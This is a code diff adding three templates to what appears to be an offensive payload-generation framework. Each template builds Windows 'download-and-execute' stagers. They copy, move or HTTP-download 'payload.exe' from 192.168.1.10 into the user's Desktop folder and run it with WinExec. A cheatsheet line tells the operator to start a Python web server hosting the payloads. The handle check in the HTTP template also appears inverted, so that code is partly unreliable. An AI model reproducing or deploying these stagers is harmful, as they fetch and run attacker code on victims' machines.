@@ -1283,3 +1283,480 @@ class IRHttpDownloadTemplate(WorkflowTemplate):
             ("Writes to", dst),
             ("Executes after download", dst),
         ]
+
+
+# ---------------------------------------------------------------------------
+# Shared: username + path construction entry blocks
+# ---------------------------------------------------------------------------
+
+
+def _username_path_entry_blocks(
+    path_prefix: str,
+    path_suffix: str,
+) -> tuple[Block, Block]:
+    """Build the common entry blocks that resolve the current username and
+    construct a destination path at runtime.
+
+    Returns (entry_block, build_path_block).
+
+    After these two blocks, the stack contains:
+      - "username_buf" (CHAR_BUFFER_128): filled with the current username
+      - "dest_path_buf" (CHAR_BUFFER_260): holds prefix + username + suffix
+      - "advapi_dll", "path_prefix", "path_suffix": string slots
+
+    The build_path block jumps to "use_path" on success, "fail" on error.
+    """
+    return (
+        Block("entry", (
+            ConstructString("advapi_dll", "advapi32.dll"),
+            ConstructString("path_prefix", path_prefix),
+            ConstructString("path_suffix", path_suffix),
+
+            AllocateStruct("username_buf", "CHAR_BUFFER_128"),
+            AllocateStruct("dest_path_buf", "CHAR_BUFFER_260"),
+            AllocateLocal("username_len"),
+
+            CallAPI(
+                "LoadLibraryA",
+                arguments=(AddressOf("advapi_dll"),),
+                result="advapi_base",
+            ),
+
+            StoreLocal("username_len", Immediate(128)),
+
+            CallAPI(
+                "GetUserNameA",
+                arguments=(
+                    AddressOf("username_buf"),
+                    AddressOf("username_len"),
+                ),
+                result="getuser_ret",
+            ),
+            Compare(
+                "getuser_ret",
+                SuccessPredicate.NONZERO,
+                true_block="build_path",
+                false_block="fail",
+            ),
+        )),
+        Block("build_path", (
+            CallAPI(
+                "lstrcpyA",
+                arguments=(
+                    AddressOf("dest_path_buf"),
+                    AddressOf("path_prefix"),
+                ),
+            ),
+            CallAPI(
+                "lstrcatA",
+                arguments=(
+                    AddressOf("dest_path_buf"),
+                    AddressOf("username_buf"),
+                ),
+            ),
+            CallAPI(
+                "lstrcatA",
+                arguments=(
+                    AddressOf("dest_path_buf"),
+                    AddressOf("path_suffix"),
+                ),
+            ),
+            Jump("use_path"),
+        )),
+    )
+
+
+# ---------------------------------------------------------------------------
+# Copy to user directory workflow
+# ---------------------------------------------------------------------------
+
+
+def build_copy_to_userdir_workflow(
+    src_path: str = r"\\192.168.1.10\share\payload.exe",
+    path_prefix: str = r"C:\Users" + "\\",
+    path_suffix: str = r"\Desktop\payload.exe",
+    exit_strategy: ExitStrategy = ExitStrategy.EXIT_PROCESS,
+) -> Workflow:
+    """Build the copy_to_userdir reference workflow.
+
+    GetUserNameA -> build dest path -> CopyFileA(src, dest) ->
+    WinExec(dest) -> exit
+
+    Copies a file to a path constructed from the current username,
+    then executes it.
+    """
+    success, fail = _make_exit_blocks(exit_strategy)
+    entry, build_path = _username_path_entry_blocks(path_prefix, path_suffix)
+    return Workflow(
+        name="ir_copy_to_userdir",
+        blocks=(
+            entry,
+            build_path,
+            Block("use_path", (
+                ConstructString("src_path", src_path),
+                CallAPI(
+                    "CopyFileA",
+                    arguments=(
+                        AddressOf("src_path"),
+                        AddressOf("dest_path_buf"),
+                        Immediate(0),  # bFailIfExists = FALSE
+                    ),
+                    result="copy_ret",
+                ),
+                Compare(
+                    "copy_ret",
+                    SuccessPredicate.NONZERO,
+                    true_block="run_payload",
+                    false_block="fail",
+                ),
+            )),
+            Block("run_payload", (
+                CallAPI(
+                    "WinExec",
+                    arguments=(AddressOf("dest_path_buf"), Immediate(0)),
+                    result="exec_ret",
+                ),
+                Compare(
+                    "exec_ret",
+                    SuccessPredicate.NONZERO,
+                    true_block="success",
+                    false_block="fail",
+                ),
+            )),
+            success,
+            fail,
+        ),
+        entry="entry",
+    )
+
+
+class IRCopyToUserdirTemplate(WorkflowTemplate):
+    """IR-backed copy_to_userdir template for CLI integration."""
+
+    def __init__(self) -> None:
+        super().__init__(build_copy_to_userdir_workflow())
+
+    def _resolve_workflow(self, config: TemplateConfig) -> Workflow:
+        strategy = _parse_exit_strategy(config.exit_strategy)
+        return build_copy_to_userdir_workflow(
+            src_path=config.src_path or r"\\192.168.1.10\share\payload.exe",
+            path_prefix=config.path_prefix or r"C:\Users" + "\\",
+            path_suffix=config.path_suffix or r"\Desktop\payload.exe",
+            exit_strategy=strategy,
+        )
+
+    def cheatsheet(self, config: TemplateConfig) -> list[tuple[str, str]]:
+        src = config.src_path or r"\\192.168.1.10\share\payload.exe"
+        prefix = config.path_prefix or r"C:\Users" + "\\"
+        suffix = config.path_suffix or r"\Desktop\payload.exe"
+        return [
+            ("Source path", src),
+            ("Destination pattern", f"{prefix}<username>{suffix}"),
+            ("Copies then executes destination", ""),
+        ]
+
+
+# ---------------------------------------------------------------------------
+# Move to user directory workflow
+# ---------------------------------------------------------------------------
+
+
+def build_move_to_userdir_workflow(
+    src_path: str = r"\\192.168.1.10\share\payload.exe",
+    path_prefix: str = r"C:\Users" + "\\",
+    path_suffix: str = r"\Desktop\payload.exe",
+    exit_strategy: ExitStrategy = ExitStrategy.EXIT_PROCESS,
+) -> Workflow:
+    """Build the move_to_userdir reference workflow.
+
+    GetUserNameA -> build dest path -> MoveFileA(src, dest) ->
+    WinExec(dest) -> exit
+
+    Moves a file to a path constructed from the current username,
+    then executes it.
+    """
+    success, fail = _make_exit_blocks(exit_strategy)
+    entry, build_path = _username_path_entry_blocks(path_prefix, path_suffix)
+    return Workflow(
+        name="ir_move_to_userdir",
+        blocks=(
+            entry,
+            build_path,
+            Block("use_path", (
+                ConstructString("src_path", src_path),
+                CallAPI(
+                    "MoveFileA",
+                    arguments=(
+                        AddressOf("src_path"),
+                        AddressOf("dest_path_buf"),
+                    ),
+                    result="move_ret",
+                ),
+                Compare(
+                    "move_ret",
+                    SuccessPredicate.NONZERO,
+                    true_block="run_payload",
+                    false_block="fail",
+                ),
+            )),
+            Block("run_payload", (
+                CallAPI(
+                    "WinExec",
+                    arguments=(AddressOf("dest_path_buf"), Immediate(0)),
+                    result="exec_ret",
+                ),
+                Compare(
+                    "exec_ret",
+                    SuccessPredicate.NONZERO,
+                    true_block="success",
+                    false_block="fail",
+                ),
+            )),
+            success,
+            fail,
+        ),
+        entry="entry",
+    )
+
+
+class IRMoveToUserdirTemplate(WorkflowTemplate):
+    """IR-backed move_to_userdir template for CLI integration."""
+
+    def __init__(self) -> None:
+        super().__init__(build_move_to_userdir_workflow())
+
+    def _resolve_workflow(self, config: TemplateConfig) -> Workflow:
+        strategy = _parse_exit_strategy(config.exit_strategy)
+        return build_move_to_userdir_workflow(
+            src_path=config.src_path or r"\\192.168.1.10\share\payload.exe",
+            path_prefix=config.path_prefix or r"C:\Users" + "\\",
+            path_suffix=config.path_suffix or r"\Desktop\payload.exe",
+            exit_strategy=strategy,
+        )
+
+    def cheatsheet(self, config: TemplateConfig) -> list[tuple[str, str]]:
+        src = config.src_path or r"\\192.168.1.10\share\payload.exe"
+        prefix = config.path_prefix or r"C:\Users" + "\\"
+        suffix = config.path_suffix or r"\Desktop\payload.exe"
+        return [
+            ("Source path (moved, not copied)", src),
+            ("Destination pattern", f"{prefix}<username>{suffix}"),
+            ("Moves then executes destination", ""),
+        ]
+
+
+# ---------------------------------------------------------------------------
+# HTTP download to user directory workflow
+# ---------------------------------------------------------------------------
+
+
+def build_http_download_to_userdir_workflow(
+    url: str = "http://192.168.1.10/payload.exe",
+    path_prefix: str = r"C:\Users" + "\\",
+    path_suffix: str = r"\Desktop\payload.exe",
+    user_agent: str = "Mozilla/5.0",
+    alloc_size: int = 0x100000,
+    exit_strategy: ExitStrategy = ExitStrategy.EXIT_PROCESS,
+) -> Workflow:
+    """Build the http_download_to_userdir reference workflow.
+
+    GetUserNameA -> build dest path ->
+    InternetOpenA -> InternetOpenUrlA -> VirtualAlloc ->
+    InternetReadFile -> InternetCloseHandle x2 ->
+    CreateFileA(dest) -> WriteFile -> CloseHandle ->
+    WinExec(dest) -> exit
+
+    Downloads a file via HTTP and writes it to a path constructed from
+    the current username, then executes it.
+    """
+    success, fail = _make_exit_blocks(exit_strategy)
+    entry, build_path = _username_path_entry_blocks(path_prefix, path_suffix)
+    return Workflow(
+        name="ir_http_download_to_userdir",
+        blocks=(
+            entry,
+            build_path,
+
+            Block("use_path", (
+                ConstructString("user_agent", user_agent),
+                ConstructString("url", url),
+                AllocateLocal("bytes_read"),
+                AllocateLocal("bytes_total"),
+
+                CallAPI(
+                    "InternetOpenA",
+                    arguments=(
+                        AddressOf("user_agent"),
+                        Immediate(1),   # INTERNET_OPEN_TYPE_DIRECT
+                        Immediate(0),
+                        Immediate(0),
+                        Immediate(0),
+                    ),
+                    result="inet_session",
+                ),
+                Compare(
+                    "inet_session",
+                    SuccessPredicate.NONZERO,
+                    true_block="open_url",
+                    false_block="fail",
+                ),
+            )),
+
+            Block("open_url", (
+                CallAPI(
+                    "InternetOpenUrlA",
+                    arguments=(
+                        NameRef("inet_session"),
+                        AddressOf("url"),
+                        Immediate(0),
+                        Immediate(0),
+                        Immediate(0),
+                        Immediate(0),
+                    ),
+                    result="inet_url",
+                ),
+                Compare(
+                    "inet_url",
+                    SuccessPredicate.NONZERO,
+                    true_block="alloc_buffer",
+                    false_block="fail",
+                ),
+            )),
+
+            Block("alloc_buffer", (
+                CallAPI(
+                    "VirtualAlloc",
+                    arguments=(
+                        Immediate(0),
+                        Immediate(alloc_size),
+                        Immediate(0x3000),  # MEM_COMMIT | MEM_RESERVE
+                        Immediate(4),       # PAGE_READWRITE
+                    ),
+                    result="virt_buf",
+                ),
+                Compare(
+                    "virt_buf",
+                    SuccessPredicate.NONZERO,
+                    true_block="read_loop",
+                    false_block="fail",
+                ),
+            )),
+
+            Block("read_loop", (
+                CallAPI(
+                    "InternetReadFile",
+                    arguments=(
+                        NameRef("inet_url"),
+                        NameRef("virt_buf"),
+                        Immediate(alloc_size),
+                        AddressOf("bytes_total"),
+                    ),
+                    result="read_ret",
+                ),
+                Compare(
+                    "bytes_total",
+                    SuccessPredicate.NONZERO,
+                    true_block="close_handles",
+                    false_block="fail",
+                ),
+            )),
+
+            Block("close_handles", (
+                CallAPI(
+                    "InternetCloseHandle",
+                    arguments=(NameRef("inet_url"),),
+                ),
+                CallAPI(
+                    "InternetCloseHandle",
+                    arguments=(NameRef("inet_session"),),
+                ),
+                Jump("write_file"),
+            )),
+
+            Block("write_file", (
+                CallAPI(
+                    "CreateFileA",
+                    arguments=(
+                        AddressOf("dest_path_buf"),
+                        Immediate(0x40000000),  # GENERIC_WRITE
+                        Immediate(0),
+                        Immediate(0),
+                        Immediate(2),           # CREATE_ALWAYS
+                        Immediate(0x80),        # FILE_ATTRIBUTE_NORMAL
+                        Immediate(0),
+                    ),
+                    result="file_handle",
+                ),
+                Compare(
+                    "file_handle",
+                    SuccessPredicate.INVALID_HANDLE,
+                    true_block="do_write",
+                    false_block="fail",
+                ),
+            )),
+
+            Block("do_write", (
+                CallAPI(
+                    "WriteFile",
+                    arguments=(
+                        NameRef("file_handle"),
+                        NameRef("virt_buf"),
+                        NameRef("bytes_total"),
+                        AddressOf("bytes_read"),
+                        Immediate(0),
+                    ),
+                ),
+                CallAPI(
+                    "CloseHandle",
+                    arguments=(NameRef("file_handle"),),
+                ),
+                Jump("exec_payload"),
+            )),
+
+            Block("exec_payload", (
+                CallAPI(
+                    "WinExec",
+                    arguments=(AddressOf("dest_path_buf"), Immediate(0)),
+                    result="exec_ret",
+                ),
+                Compare(
+                    "exec_ret",
+                    SuccessPredicate.NONZERO,
+                    true_block="success",
+                    false_block="fail",
+                ),
+            )),
+
+            success,
+            fail,
+        ),
+        entry="entry",
+    )
+
+
+class IRHttpDownloadToUserdirTemplate(WorkflowTemplate):
+    """IR-backed http_download_to_userdir template for CLI integration."""
+
+    def __init__(self) -> None:
+        super().__init__(build_http_download_to_userdir_workflow())
+
+    def _resolve_workflow(self, config: TemplateConfig) -> Workflow:
+        strategy = _parse_exit_strategy(config.exit_strategy)
+        return build_http_download_to_userdir_workflow(
+            url=config.url or "http://192.168.1.10/payload.exe",
+            path_prefix=config.path_prefix or r"C:\Users" + "\\",
+            path_suffix=config.path_suffix or r"\Desktop\payload.exe",
+            alloc_size=config.alloc_size or 0x100000,
+            exit_strategy=strategy,
+        )
+
+    def cheatsheet(self, config: TemplateConfig) -> list[tuple[str, str]]:
+        url = config.url or "http://192.168.1.10/payload.exe"
+        prefix = config.path_prefix or r"C:\Users" + "\\"
+        suffix = config.path_suffix or r"\Desktop\payload.exe"
+        return [
+            ("Start HTTP server", "python3 -m http.server 80 --directory /path/to/payloads"),
+            ("Download URL", url),
+            ("Destination pattern", f"{prefix}<username>{suffix}"),
+            ("Downloads, writes, then executes", ""),
+        ]
